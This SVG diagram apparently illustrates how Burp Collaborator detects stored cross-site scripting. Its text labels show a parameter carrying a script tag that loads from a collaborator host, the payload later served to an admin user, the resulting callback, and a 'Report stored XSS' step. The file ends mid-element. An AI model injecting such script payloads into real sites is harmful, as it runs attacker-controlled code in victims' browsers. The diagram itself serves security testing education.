<svg xmlns="http://www.w3.org/2000/svg" width="807" height="768" viewBox="0 0 807 768">
  <title>collaborator-5</title>
  <g>
    <g>
      <g>
        <polygon points="60.77 82.18 35.64 77.3 35.64 39.09 60.77 34.17 60.77 82.18" fill="#404041"/>
        <polygon points="61.94 82.18 87.1 77.3 87.1 39.09 61.94 34.17 61.94 82.18" fill="#f63"/>
        <path d="M73.86,40c.86.19,1.28.27,2.15.42V47c-2.53,2.48-3.78,3.81-6.3,6.71,2.52.12,3.77.15,6.3.27v6.52c3.47-.12,5.2-.15,8.6-.27A106.49,106.49,0,0,0,76,70.13v5.14c-.87.19-1.29.27-2.15.42v-6c2.52-3.21,3.77-4.73,6.26-7.52-2.53.16-3.77.2-6.3.35V55.83l-8.6-.19A107.92,107.92,0,0,1,73.82,46V43.24C73.86,42,73.86,41.3,73.86,40Z" fill="#fff"/>
      </g>
      <g>
        <path d="M1.41,120.94c-.95,0-1.36-.4-1.36-1.35V97.85c0-.95.41-1.36,1.36-1.36H8.6c2.38,0,5.05,2.13,5.05,6a6.5,6.5,0,0,1-2.12,4.88c1.94,1.58,2.93,3,2.93,6.34,0,4.8-3.45,7.22-6.34,7.22Zm1.32-14.88H8.38c1.46,0,2.6-1.28,2.6-3.56s-1-3.33-2.6-3.33H2.73Zm0,12.21H8.38c1.57,0,3.51-1.29,3.51-4.55a4.74,4.74,0,0,0-1.06-3.52,2.89,2.89,0,0,0-2.45-1.46H2.73Z" fill="#f63"/>
        <path d="M30.92,113.87a7.32,7.32,0,0,1-14.63,0V98a1.48,1.48,0,0,1,1.36-1.58A1.48,1.48,0,0,1,19,98v16a5,5,0,0,0,1.9,3.52,3.71,3.71,0,0,0,2.72.88,3.75,3.75,0,0,0,2.74-.88A4.89,4.89,0,0,0,28.24,114V98a1.45,1.45,0,0,1,1.32-1.58A1.5,1.5,0,0,1,30.92,98Z" fill="#f63"/>
        <path d="M41.51,96.49c4.29,0,6.93,2.75,6.93,7.22,0,2.5-.48,4.37-1.69,5.61a5.87,5.87,0,0,1-3.41,1.73l4.29,7.73a1.37,1.37,0,0,1,.26,1,1.41,1.41,0,0,1-1.1,1.21c-.59,0-1.07,0-1.47-.73l-5-9H36.12v8.43c0,1-.37,1.35-1.32,1.35s-1.36-.4-1.36-1.35V97.85c0-.95.41-1.36,1.36-1.36Zm-5.39,2.68v9.31h6.2a2.36,2.36,0,0,0,2.41-1.1,5.24,5.24,0,0,0,1-3.67c0-3.26-1.94-4.54-3.52-4.54Z" fill="#f63"/>
        <path d="M59.07,96.49c4.28,0,6.92,2.75,6.92,7.22,0,3.49-.91,5.47-3.19,6.71a6.54,6.54,0,0,1-3.62.74h-5.5v8.43c0,1-.37,1.35-1.32,1.35s-1.36-.4-1.36-1.35V97.85c0-.95.4-1.36,1.36-1.36Zm-5.39,2.68v9.31h6.19a2.37,2.37,0,0,0,2.42-1.1,5.24,5.24,0,0,0,1-3.67c0-3.26-2-4.54-3.52-4.54Z" fill="#f63"/>
        <path d="M78.45,109.8a6.06,6.06,0,0,1,2.9,5.35c0,2.68-2.79,5.94-7.62,5.94a16.89,16.89,0,0,1-3.93-.62c-2.56-.74-3-.55-3-2,0-.44.33-1.14,1.62-1.14.66,0,2.49,1.1,5.2,1.1,3.12,0,5-1.87,5-3.7a3.27,3.27,0,0,0-1.61-2.57l-7.37-4.94a5.72,5.72,0,0,1-2.75-4.66c0-3.7,2.94-6.3,7.15-6.3a5.42,5.42,0,0,1,1.5.14c3.12.85,5,1.29,5,2.72a1.28,1.28,0,0,1-1.46,1.28c-.85,0-2.39-1.47-4.91-1.47-3,0-4.55,1.69-4.55,3.41a3.37,3.37,0,0,0,1.5,2.6Z" fill="#404042"/>
        <path d="M97.73,113.87a7.31,7.31,0,0,1-14.62,0V98a1.35,1.35,0,1,1,2.67,0v16a5,5,0,0,0,1.91,3.52,3.7,3.7,0,0,0,2.71.88,3.78,3.78,0,0,0,2.75-.88A4.92,4.92,0,0,0,95.06,114V98a1.45,1.45,0,0,1,1.32-1.58A1.5,1.5,0,0,1,97.73,98Z" fill="#404042"/>
        <path d="M100.26,97.85c0-.95.4-1.36,1.36-1.36s1.32.41,1.32,1.36v21.74c0,1-.37,1.35-1.32,1.35s-1.36-.4-1.36-1.35Z" fill="#404042"/>
        <path d="M112.69,99.17v20.42c0,1-.41,1.35-1.36,1.35s-1.32-.4-1.32-1.35V99.17h-4.58a1.17,1.17,0,0,1-1.28-1.32,1.2,1.2,0,0,1,1.28-1.36h11.84a1.2,1.2,0,0,1,1.28,1.36,1.17,1.17,0,0,1-1.28,1.32Z" fill="#404042"/>
        <path d="M122.43,118.27h8.07a1.17,1.17,0,0,1,1.28,1.32,1.19,1.19,0,0,1-1.28,1.35h-9.38c-1,0-1.36-.4-1.36-1.35V97.85c0-.95.4-1.36,1.36-1.36h9.38a1.2,1.2,0,0,1,1.28,1.36,1.17,1.17,0,0,1-1.28,1.32h-8.07v7.11h5.72c.81,0,1.25.48,1.25,1.36S129,109,128.15,109h-5.72Z" fill="#404042"/>
      </g>
    </g>
    <polygon points="0 217.42 355.61 217.42 355.61 223.2 367 216.63 355.61 210.05 355.61 215.83 0 215.83 0 217.42" fill="#ff774a"/>
    <polygon points="806 308.83 450.89 308.83 450.89 303.05 439.5 309.63 450.89 316.2 450.89 310.42 806 310.42 806 308.83" fill="#1d81c4"/>
    <polygon points="367 670.83 11.39 670.83 11.39 665.05 0 671.63 11.39 678.2 11.39 672.42 367 672.42 367 670.83" fill="#1d81c4"/>
    <polygon points="440.52 371.42 791.61 371.42 791.61 377.2 803 370.63 791.61 364.05 791.61 369.83 440.52 369.83 440.52 371.42" fill="#ff774a"/>
    <path d="M1.21,691.88v39.58c0,.09-.05.25.1.21h29.8v5.78l11.39-6.57L31.11,724.3v5.78H2.87c-.11,0-.07-.09-.08-.16v-38Z" fill="#ff774a"/>
    <path d="M748.77,216.12a11.29,11.29,0,1,0-10.43,0c-7.42,2.67-12.84,10.86-12.84,20.53a25,25,0,0,0,1,6.86l.23.82h33.73l.24-.82a25.36,25.36,0,0,0,1-6.86C761.62,227,756.2,218.79,748.77,216.12Zm-14.24-10a9,9,0,1,1,9,9A9,9,0,0,1,734.53,206.17Zm24.17,35.91H728.42a22.73,22.73,0,0,1-.66-5.43c0-10.58,7.09-19.19,15.8-19.19s15.8,8.61,15.8,19.19A22.73,22.73,0,0,1,758.7,242.08Z" fill="#f63"/>
    <g>
      <path d="M792.38,210.05v-8.19h-3.94a10.63,10.63,0,0,0-.65-1.61l2.77-2.77-5.79-5.79L782,194.43a13,13,0,0,0-1.63-.67v-3.88h-8.2v3.88a13,13,0,0,0-1.63.67l-2.75-2.74L762,197.48l2.77,2.77a12,12,0,0,0-.65,1.61h-3.93v8.19h4a10.85,10.85,0,0,0,.66,1.57L762,214.43l5.79,5.8,2.84-2.84a13.11,13.11,0,0,0,1.54.64v4h8.2v-4a11.56,11.56,0,0,0,1.54-.63l2.84,2.84,5.79-5.8-2.81-2.81a12.65,12.65,0,0,0,.65-1.57Zm-5.2-1.65-.18.6a11.2,11.2,0,0,1-1,2.37l-.31.55,2.52,2.51-3.45,3.46-2.54-2.54-.54.31a11.13,11.13,0,0,1-2.35,1l-.61.17v3.6h-4.88v-3.6l-.6-.17a11.44,11.44,0,0,1-2.36-1l-.54-.31-2.54,2.54-3.45-3.46,2.52-2.51-.31-.55a11.2,11.2,0,0,1-1-2.37l-.17-.6h-3.55v-4.88h3.52l.17-.61a10.93,10.93,0,0,1,1-2.42l.31-.54-2.47-2.47,3.45-3.45,2.46,2.45.54-.31a11.4,11.4,0,0,1,2.44-1l.6-.17v-3.46h4.88V195l.61.17a11,11,0,0,1,2.42,1l.55.31,2.46-2.45,3.45,3.45L785.76,200l.3.54a10.93,10.93,0,0,1,1,2.42l.17.61h3.52v4.88Z" fill="#f63"/>
      <path d="M776.29,199.68a6.28,6.28,0,1,0,6.28,6.28A6.29,6.29,0,0,0,776.29,199.68Zm0,10.9a4.62,4.62,0,1,1,4.62-4.62A4.62,4.62,0,0,1,776.29,210.58Z" fill="#f63"/>
    </g>
    <g>
      <path d="M440.5,269.52v-12h2.56v9.94h4.39v2.11Z" fill="#4c5054"/>
      <path d="M454.69,269.52l-.48-1.25h-.08a5.17,5.17,0,0,1-.54.64,2.65,2.65,0,0,1-1.32.7,4.92,4.92,0,0,1-.92.08,2.91,2.91,0,0,1-1-.18,2.32,2.32,0,0,1-.83-.53,2.58,2.58,0,0,1-.55-.91,3.9,3.9,0,0,1-.2-1.3,2.52,2.52,0,0,1,.94-2.16,5,5,0,0,1,2.81-.77l1.47,0v-.7a1,1,0,0,0-.33-.84,1.42,1.42,0,0,0-.92-.27,4.12,4.12,0,0,0-1.16.17,6.77,6.77,0,0,0-1.13.47l-.82-1.67a6.52,6.52,0,0,1,1.53-.61,6.81,6.81,0,0,1,1.77-.22,3.86,3.86,0,0,1,2.64.81,3.08,3.08,0,0,1,.92,2.45v6.14Zm-.74-4.27-.83,0a2.87,2.87,0,0,0-.85.13,1.57,1.57,0,0,0-.56.31,1.08,1.08,0,0,0-.3.46,1.64,1.64,0,0,0-.1.6,1.08,1.08,0,0,0,.28.82,1.1,1.1,0,0,0,.74.24,1.69,1.69,0,0,0,.64-.12,1.41,1.41,0,0,0,.51-.35,1.76,1.76,0,0,0,.35-.58A2.39,2.39,0,0,0,454,266Z" fill="#4c5054"/>
      <path d="M462.78,267.69a2.63,2.63,0,0,0,.7-.09,5.82,5.82,0,0,0,.68-.2v1.87a3.82,3.82,0,0,1-.87.3,5.14,5.14,0,0,1-1.15.12,4.46,4.46,0,0,1-1.12-.14,2.32,2.32,0,0,1-.9-.49,2.4,2.4,0,0,1-.59-.94,4.2,4.2,0,0,1-.22-1.48V262.2h-1.2v-1.07l1.38-.84.73-1.94h1.6v2h2.25v1.89h-2.25v4.44a1,1,0,0,0,.27.79A.94.94,0,0,0,462.78,267.69Z" fill="#4c5054"/>
      <path d="M470.07,269.69a5.65,5.65,0,0,1-1.82-.29,3.8,3.8,0,0,1-1.43-.87,4.09,4.09,0,0,1-.94-1.47,5.93,5.93,0,0,1-.33-2.08,6.78,6.78,0,0,1,.3-2.12,4.27,4.27,0,0,1,.86-1.51,3.4,3.4,0,0,1,1.32-.91,4.65,4.65,0,0,1,1.71-.31,4.76,4.76,0,0,1,1.65.28,3.34,3.34,0,0,1,1.25.81,3.5,3.5,0,0,1,.79,1.32,5.16,5.16,0,0,1,.28,1.78v1.22h-5.62a3.09,3.09,0,0,0,.17.95,1.85,1.85,0,0,0,.43.72,1.69,1.69,0,0,0,.66.45,2.29,2.29,0,0,0,.9.16,6.56,6.56,0,0,0,.79-.05,5.55,5.55,0,0,0,.73-.13,5.73,5.73,0,0,0,.7-.23c.23-.09.47-.2.71-.32v2a6.31,6.31,0,0,1-.66.29,4.91,4.91,0,0,1-.71.2,4.64,4.64,0,0,1-.8.12A8.93,8.93,0,0,1,470.07,269.69Zm-.32-7.77a1.49,1.49,0,0,0-1.11.47,2.36,2.36,0,0,0-.5,1.48h3.2a3.2,3.2,0,0,0-.1-.78,1.93,1.93,0,0,0-.3-.61,1.49,1.49,0,0,0-.49-.41A1.54,1.54,0,0,0,469.75,261.92Z" fill="#4c5054"/>
      <path d="M480.64,260.13h.45l.21,0,.14,0v2.36l-.18,0-.24,0h-.46a2.82,2.82,0,0,0-.89.13,1.66,1.66,0,0,0-.71.4,1.85,1.85,0,0,0-.45.72,3.23,3.23,0,0,0-.16,1.1v4.69h-2.51v-9.21h1.9l.37,1.38h.13a5.06,5.06,0,0,1,.42-.64,2.66,2.66,0,0,1,.52-.49,2,2,0,0,1,.64-.31A2.57,2.57,0,0,1,480.64,260.13Z" fill="#4c5054"/>
      <path d="M482.81,268.34a1.8,1.8,0,0,1,.11-.65,1.16,1.16,0,0,1,.31-.43,1.26,1.26,0,0,1,.46-.24,2.12,2.12,0,0,1,.57-.08,2,2,0,0,1,.55.08,1.35,1.35,0,0,1,.46.24,1.16,1.16,0,0,1,.31.43,1.6,1.6,0,0,1,.12.65,1.56,1.56,0,0,1-.12.64,1.29,1.29,0,0,1-.31.44,1.38,1.38,0,0,1-.46.25,2,2,0,0,1-.55.08,2.12,2.12,0,0,1-.57-.08,1.17,1.17,0,0,1-.77-.69A1.75,1.75,0,0,1,482.81,268.34Z" fill="#4c5054"/>
      <path d="M487.62,268.34a1.6,1.6,0,0,1,.12-.65,1,1,0,0,1,.3-.43,1.31,1.31,0,0,1,.47-.24,2,2,0,0,1,.57-.08,1.91,1.91,0,0,1,.54.08,1.19,1.19,0,0,1,.46.24,1.06,1.06,0,0,1,.31.43,1.6,1.6,0,0,1,.12.65,1.56,1.56,0,0,1-.12.64,1.17,1.17,0,0,1-.31.44,1.21,1.21,0,0,1-.46.25,1.91,1.91,0,0,1-.54.08,2,2,0,0,1-.57-.08,1.33,1.33,0,0,1-.47-.25,1.15,1.15,0,0,1-.3-.44A1.56,1.56,0,0,1,487.62,268.34Z" fill="#4c5054"/>
      <path d="M492.44,268.34a1.8,1.8,0,0,1,.11-.65,1.06,1.06,0,0,1,.31-.43,1.26,1.26,0,0,1,.46-.24,2.12,2.12,0,0,1,.57-.08,2,2,0,0,1,.55.08,1.35,1.35,0,0,1,.46.24,1.16,1.16,0,0,1,.31.43,1.61,1.61,0,0,1,.11.65,1.56,1.56,0,0,1-.11.64,1.29,1.29,0,0,1-.31.44,1.38,1.38,0,0,1-.46.25,2,2,0,0,1-.55.08,2.12,2.12,0,0,1-.57-.08,1.29,1.29,0,0,1-.46-.25,1.17,1.17,0,0,1-.31-.44A1.75,1.75,0,0,1,492.44,268.34Z" fill="#4c5054"/>
    </g>
    <polygon points="806.5 491.71 451.39 491.71 451.39 485.92 440 492.5 451.39 499.08 451.39 493.29 806.5 493.29 806.5 491.71" fill="#1d81c4"/>
    <polygon points="0 626.42 355.61 626.42 355.61 632.2 367 625.63 355.61 619.05 355.61 624.83 0 624.83 0 626.42" fill="#1d81c4"/>
    <rect x="42" y="707.5" width="152" height="40" fill="#fcebe8" stroke="#f63" stroke-miterlimit="10" stroke-width="0.5"/>
    <text transform="translate(0.5 188.9)" font-size="14" fill="#f63" font-family="Courier, Courier">?param=&lt;script src=<tspan x="159.63" y="0" font-family="AndaleMono, Andale Mono">”</tspan><tspan x="168.03" y="0">http://f2682...</tspan><tspan x="0" y="16.8">...few9.burpcollaborator.net/&gt;</tspan></text>
    <text transform="translate(735.5 297.82)" font-size="14" fill="#0071bc" font-family="Courier, Courier">GET /log</text>
    <text transform="translate(702.69 267.4)" font-size="16.88" fill="#4c5054" font-family="DroidSans-Bold, Droid Sans" font-weight="700">Admin user</text>
    <text transform="translate(439.5 341.9)" font-size="14" fill="#f63" font-family="Courier, Courier">&lt;script src=<tspan x="100.82" y="0" font-family="AndaleMono, Andale Mono">”</tspan><tspan x="109.22" y="0">http://f2682...</tspan><tspan x="0" y="16.8">...few9.burpcollaborator.net/&gt;</tspan></text>
    <text transform="translate(565 463.7)" font-size="14" fill="#0071bc" font-family="Courier, Courier">GET http://f2682...<tspan x="0" y="16.8">...few9.burpcollaborator.net/</tspan></text>
    <text transform="translate(0.49 581.4)" font-size="16.88" fill="#4c5054" font-family="DroidSans-Bold, Droid Sans" font-weight="700">Later...</text>
    <text transform="translate(55.49 730.9)" font-size="13" fill="#4c5054" font-family="Verdana, Verdana"><tspan letter-spacing="-0.02em">R</tspan><tspan x="8.72" y="0">eport stored X</tspan><tspan x="102.35" y="0" letter-spacing="-0.01em">S</tspan><tspan x="111.1" y="0">S</tspan></text>
    <polygon points="375.8 477.01 371.7 477.01 375.8 472.61 375.8 464.94 374.07 464.94 374.07 472.01 367.22 478.73 374.07 478.73 374.07 484.26 377.92 484.19 374.07 488.23 374.07 495.97 375.8 495.97 375.8 488.83 382.02 482.18 375.8 482.18 375.8 477.01" fill="#fff"/>
    <g>
      <path d="M316.44,545.78c-.57,0-.82-.24-.82-.81V531.9c0-.57.25-.82.82-.82h4.32c1.43,0,3,1.28,3,3.62a3.92,3.92,0,0,1-1.28,2.93,4.14,4.14,0,0,1,1.77,3.81,4,4,0,0,1-3.82,4.34Zm.79-8.94h3.4c.88,0,1.56-.78,1.56-2.14s-.59-2-1.56-2h-3.4Zm0,7.34h3.4c.95,0,2.11-.78,2.11-2.74a2.81,2.81,0,0,0-.64-2.11,1.71,1.71,0,0,0-1.47-.89h-3.4Z" fill="#ea5c2c"/>
      <path d="M334.18,541.53a4.4,4.4,0,0,1-8.79,0V532a.81.81,0,1,1,1.61,0v9.64a3,3,0,0,0,1.14,2.11,2.19,2.19,0,0,0,1.63.53,2.25,2.25,0,0,0,1.66-.53,2.92,2.92,0,0,0,1.14-2.11V532a.87.87,0,0,1,.8-.94.9.9,0,0,1,.81.94Z" fill="#ea5c2c"/>
      <path d="M340.55,531.08c2.58,0,4.17,1.66,4.17,4.35a4.65,4.65,0,0,1-1,3.37,3.45,3.45,0,0,1-2.05,1l2.58,4.65a.82.82,0,0,1-.51,1.3c-.35,0-.63,0-.88-.44l-3-5.44h-2.51V545c0,.57-.22.81-.79.81s-.82-.24-.82-.81V531.9c0-.57.24-.82.82-.82Zm-3.24,1.61v5.6H341a1.43,1.43,0,0,0,1.45-.66,3.14,3.14,0,0,0,.62-2.2c0-2-1.17-2.74-2.12-2.74Z" fill="#ea5c2c"/>
      <path d="M351.11,531.08c2.58,0,4.16,1.66,4.16,4.35,0,2.09-.55,3.28-1.91,4a4,4,0,0,1-2.19.44h-3.3V545c0,.57-.22.81-.8.81s-.81-.24-.81-.81V531.9c0-.57.24-.82.81-.82Zm-3.24,1.61v5.6h3.72a1.44,1.44,0,0,0,1.46-.66,3.18,3.18,0,0,0,.61-2.2c0-2-1.16-2.74-2.11-2.74Z" fill="#ea5c2c"/>
      <path d="M362.24,544.18a.7.7,0,0,1,.77.79.72.72,0,0,1-.77.81h-2.65a4,4,0,0,1-3.81-4.34v-6a4,4,0,0,1,3.81-4.35h2.65a.72.72,0,0,1,.77.82.69.69,0,0,1-.77.79H360a2.27,2.27,0,0,0-1.48.38,3,3,0,0,0-1.12,2.29v6.17a2.89,2.89,0,0,0,1.12,2.27,2.3,2.3,0,0,0,1.48.38Z" fill="#404042"/>
      <path d="M372.59,541.44a4.47,4.47,0,0,1-8.94,0v-6.08a4.47,4.47,0,0,1,8.94,0Zm-7.33.09a2.68,2.68,0,0,0,.57,1.61,2.45,2.45,0,0,0,2.29,1.1,2.24,2.24,0,0,0,1.72-.53,2.94,2.94,0,0,0,1.15-2.18v-6.26a2.84,2.84,0,0,0-.58-1.54,2.45,2.45,0,0,0-2.29-1.1,2.22,2.22,0,0,0-1.72.52,2.94,2.94,0,0,0-1.14,2.12Z" fill="#404042"/>
      <path d="M375.72,544.18H381a.7.7,0,0,1,.77.79.71.71,0,0,1-.77.81h-6.06c-.57,0-.81-.24-.81-.81V531.9c0-.57.24-.82.81-.82s.79.25.79.82Z" fill="#404042"/>
      <path d="M384,544.18h5.27a.7.7,0,0,1,.77.79.72.72,0,0,1-.77.81h-6.06c-.58,0-.82-.24-.82-.81V531.9c0-.57.24-.82.82-.82s.79.25.79.82Z" fill="#404042"/>
      <path d="M392.16,542.37l-.92,2.91c-.09.26-.29.5-.51.5-.75,0-1.08-.3-1.08-.66a.9.9,0,0,1,.05-.37l4.14-12.9c.18-.55.35-.77.88-.77s.71.22.88.77l4.15,12.9a1.11,1.11,0,0,1,0,.37c0,.36-.33.66-1.08.66-.22,0-.42-.24-.51-.5l-.92-2.91Zm.58-1.61h4l-2-6.06Z" fill="#404042"/>
      <path d="M401.55,545.78c-.57,0-.81-.24-.81-.81V531.9c0-.57.24-.82.81-.82h4.32a3.31,3.31,0,0,1,3.05,3.62,3.92,3.92,0,0,1-1.28,2.93,4.13,4.13,0,0,1,1.76,3.81,4,4,0,0,1-3.81,4.34Zm.8-8.94h3.39c.88,0,1.57-.78,1.57-2.14s-.6-2-1.57-2h-3.39Zm0,7.34h3.39c.95,0,2.12-.78,2.12-2.74a2.85,2.85,0,0,0-.64-2.11,1.74,1.74,0,0,0-1.48-.89h-3.39Z" fill="#404042"/>
      <path d="M419.45,541.44a4.48,4.48,0,0,1-8.95,0v-6.08a4.48,4.48,0,0,1,8.95,0Zm-7.34.09a2.75,2.75,0,0,0,.57,1.61,2.45,2.45,0,0,0,2.3,1.1,2.21,2.21,0,0,0,1.71-.53,2.9,2.9,0,0,0,1.15-2.18v-6.26a2.91,2.91,0,0,0-.57-1.54,2.45,2.45,0,0,0-2.29-1.1,2.21,2.21,0,0,0-1.72.52,3,3,0,0,0-1.15,2.12Z" fill="#404042"/>
      <path d="M425.82,531.08c2.58,0,4.16,1.66,4.16,4.35a4.65,4.65,0,0,1-1,3.37,3.48,3.48,0,0,1-2.05,1l2.58,4.65a.85.85,0,0,1,.15.58.83.83,0,0,1-.66.72c-.35,0-.64,0-.88-.44l-3-5.44h-2.51V545c0,.57-.22.81-.8.81s-.81-.24-.81-.81V531.9c0-.57.24-.82.81-.82Zm-3.24,1.61v5.6h3.72a1.44,1.44,0,0,0,1.46-.66,3.18,3.18,0,0,0,.61-2.2c0-2-1.16-2.74-2.11-2.74Z" fill="#404042"/>
      <path d="M433,542.37l-.92,2.91c-.09.26-.29.5-.51.5-.75,0-1.08-.3-1.08-.66a1.11,1.11,0,0,1,0-.37l4.15-12.9c.17-.55.35-.77.88-.77s.7.22.88.77l4.14,12.9a.9.9,0,0,1,.05.37c0,.36-.33.66-1.08.66-.22,0-.42-.24-.51-.5l-.92-2.91Zm.58-1.61h4l-2-6.06Z" fill="#404042"/>
      <path d="M445.45,532.69V545c0,.57-.24.81-.81.81s-.79-.24-.79-.81V532.69h-2.76a.7.7,0,0,1-.77-.79.72.72,0,0,1,.77-.82h7.12a.72.72,0,0,1,.77.82.7.7,0,0,1-.77.79Z" fill="#404042"/>
      <path d="M458.22,541.44a4.48,4.48,0,0,1-9,0v-6.08a4.48,4.48,0,0,1,9,0Zm-7.34.09a2.68,2.68,0,0,0,.57,1.61,2.45,2.45,0,0,0,2.29,1.1,2.23,2.23,0,0,0,1.72-.53,2.9,2.9,0,0,0,1.15-2.18v-6.26a2.84,2.84,0,0,0-.58-1.54,2.45,2.45,0,0,0-2.29-1.1,2.22,2.22,0,0,0-1.72.52,2.94,2.94,0,0,0-1.14,2.12Z" fill="#404042"/>
      <path d="M464.58,531.08c2.58,0,4.17,1.66,4.17,4.35a4.69,4.69,0,0,1-1,3.37,3.51,3.51,0,0,1-2.05,1l2.58,4.65a.91.91,0,0,1,.15.58.84.84,0,0,1-.66.72c-.35,0-.64,0-.88-.44l-3-5.44h-2.52V545c0,.57-.22.81-.79.81s-.81-.24-.81-.81V531.9c0-.57.24-.82.81-.82Zm-3.24,1.61v5.6h3.73a1.42,1.42,0,0,0,1.45-.66,3.14,3.14,0,0,0,.62-2.2c0-2-1.17-2.74-2.11-2.74Z" fill="#404042"/>
    </g>
    <g>
      <path d="M348.47,489.65a4.59,4.59,0,0,1-.25,1.51,2.87,2.87,0,0,1-.69,1.08,2.82,2.82,0,0,1-1.1.65,4.47,4.47,0,0,1-1.47.2h-1.8l.06-6.82h2a4.06,4.06,0,0,1,1.35.23,2.67,2.67,0,0,1,1.68,1.7A4.29,4.29,0,0,1,348.47,489.65Zm-1.47,0a3.56,3.56,0,0,0-.1-1,2,2,0,0,0-.33-.69,1.23,1.23,0,0,0-.53-.4,1.81,1.81,0,0,0-.72-.14h-.67l0,4.45h.53a1.67,1.67,0,0,0,1.38-.55A2.57,2.57,0,0,0,347,489.67Z" fill="#4c5054"/>
      <path d="M355.62,493.19l-1.84,0L351.14,488h0c0,.24,0,.48,0,.72s0,.41,0,.64v.6l0,3.21h-1.3l.06-6.83,1.83,0,2.63,5.13h0l0-.7c0-.1,0-.2,0-.3s0-.21,0-.32v-.56l0-3.23h1.3Z" fill="#4c5054"/>
      <path d="M361.09,491.34a2,2,0,0,1-.16.82,1.76,1.76,0,0,1-.46.62,2.09,2.09,0,0,1-.74.39,3.42,3.42,0,0,1-1,.14,4.34,4.34,0,0,1-1-.12,3.45,3.45,0,0,1-.85-.31v-1.34l.45.21c.16.06.31.13.47.18a3.62,3.62,0,0,0,.47.13,2.42,2.42,0,0,0,.47.05,1.28,1.28,0,0,0,.41-.05.59.59,0,0,0,.27-.15.69.69,0,0,0,.16-.22.93.93,0,0,0,.05-.29.71.71,0,0,0-.08-.34,1,1,0,0,0-.23-.28,1.66,1.66,0,0,0-.35-.25c-.14-.09-.29-.17-.46-.26l-.48-.28a2.66,2.66,0,0,1-.5-.4,2.39,2.39,0,0,1-.39-.57,1.94,1.94,0,0,1-.15-.8,2.1,2.1,0,0,1,.16-.82,1.68,1.68,0,0,1,.44-.61,1.86,1.86,0,0,1,.68-.37,2.77,2.77,0,0,1,.89-.13l.49,0a3.78,3.78,0,0,1,.46.1,4.26,4.26,0,0,1,.47.15l.48.21-.48,1.12-.39-.17a1.74,1.74,0,0,0-.36-.13,1.32,1.32,0,0,0-.33-.08,1.87,1.87,0,0,0-.34,0,.76.76,0,0,0-.56.19.69.69,0,0,0-.19.51.62.62,0,0,0,.05.31.72.72,0,0,0,.19.25,1.57,1.57,0,0,0,.33.24l.49.28c.23.13.44.25.64.39a2.63,2.63,0,0,1,.5.43,1.64,1.64,0,0,1,.32.54A1.69,1.69,0,0,1,361.09,491.34Z" fill="#4c5054"/>
    </g>
    <g>
      <path d="M349.21,519.42a2.18,2.18,0,0,1-.17.82,1.65,1.65,0,0,1-.46.62,2.09,2.09,0,0,1-.74.39,3.11,3.11,0,0,1-1,.13,4.35,4.35,0,0,1-1-.11A3.45,3.45,0,0,1,345,521l0-1.35a4.71,4.71,0,0,0,.45.22l.46.18a4.12,4.12,0,0,0,.47.13,2.5,2.5,0,0,0,.47.05,1.64,1.64,0,0,0,.41-.05.7.7,0,0,0,.27-.15.57.57,0,0,0,.16-.22.94.94,0,0,0,.05-.3.66.66,0,0,0-.08-.34,1.09,1.09,0,0,0-.22-.27,2.8,2.8,0,0,0-.36-.26l-.46-.26-.48-.27a3,3,0,0,1-.5-.4,2.1,2.1,0,0,1-.38-.57,1.81,1.81,0,0,1-.16-.8,2.3,2.3,0,0,1,.16-.82,1.8,1.8,0,0,1,.44-.61,1.86,1.86,0,0,1,.68-.37,2.84,2.84,0,0,1,.9-.13,3.88,3.88,0,0,1,.48,0,2.63,2.63,0,0,1,.47.1l.46.15.48.21-.48,1.12-.39-.18-.35-.12a1.51,1.51,0,0,0-.34-.08l-.33,0a.71.71,0,0,0-.56.19.68.68,0,0,0-.2.51,1,1,0,0,0,.05.31.72.72,0,0,0,.19.25,1.57,1.57,0,0,0,.33.24l.49.28c.23.12.44.25.64.38a2.67,2.67,0,0,1,.5.44,1.82,1.82,0,0,1,.33.53A2.16,2.16,0,0,1,349.21,519.42Z" fill="#4c5054"/>
      <path d="M353.2,521.35,351.75,516h0c0,.28,0,.56,0,.83,0,.11,0,.23,0,.35s0,.25,0,.36,0,.24,0,.34v.3l0,3.17h-1.29l.06-6.82h2l1.43,5.24h0l1.61-5.21,2,0-.06,6.82h-1.35l0-3.23v-.28c0-.1,0-.21,0-.32s0-.23,0-.35,0-.24,0-.35,0-.53,0-.81h0l-1.67,5.33Z" fill="#4c5054"/>
      <path d="M361.68,521.42h-1.45l0-5.62-1.71,0v-1.2l4.86,0v1.2h-1.71Z" fill="#4c5054"/>
      <path d="M368.9,516.78a2.72,2.72,0,0,1-.14.86,1.82,1.82,0,0,1-.45.72,2.13,2.13,0,0,1-.82.49,3.82,3.82,0,0,1-1.26.18h-.33l0,2.42h-1.45l.06-6.82h1.9a4.1,4.1,0,0,1,1.13.16,2.07,2.07,0,0,1,.79.43,1.65,1.65,0,0,1,.45.67A2.28,2.28,0,0,1,368.9,516.78Zm-3,1.06h.29a1.44,1.44,0,0,0,.92-.23,1.15,1.15,0,0,0,.05-1.54,1.33,1.33,0,0,0-.87-.25h-.37Z" fill="#4c5054"/>
    </g>
    <path d="M401.15,468.05a21.91,21.91,0,1,1,0,43.81" fill="#f63" stroke="#f63" stroke-miterlimit="10" stroke-width="2"/>
    <polygon points="411.56 487.46 407.88 487.46 411.56 483.5 411.56 476.6 410.01 476.6 410.01 482.96 403.84 489.02 410.01 489.02 410.01 494 413.47 493.93 410.01 497.57 410.01 504.54 411.56 504.54 411.56 498.11 417.16 492.12 411.56 492.12 411.56 487.46" fill="#fff"/>
    <line x1="372.19" y1="489.95" x2="400.84" y2="489.95" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/>
    <path d="M400.84,511.86a21.91,21.91,0,1,1,0-43.81Z" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/>
    <path d="M401.53,511.86c-6.6,0-11.95-9.81-11.95-21.9s5.35-21.91,11.95-21.91" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/>
    <path d="M400.84,480.31c-5.85,0-19.09-.35-23.07-13.89" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/>
    <path d="M400.84,499.08c-5.85,0-19.09.35-23.07,13.89" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/>
    <g>
      <path d="M353.52,464.92h-1.44V462h-2.32v2.95h-1.45v-6.83h1.45v2.68h2.32v-2.68h1.44Z" fill="#4c5054"/>
      <path d="M357.73,464.92h-1.44V459.3h-1.71v-1.21h4.86v1.21h-1.71Z" fill="#4c5054"/>
      <path d="M363.07,464.92h-1.44V459.3h-1.71v-1.21h4.86v1.21h-1.71Z" fill="#4c5054"/>
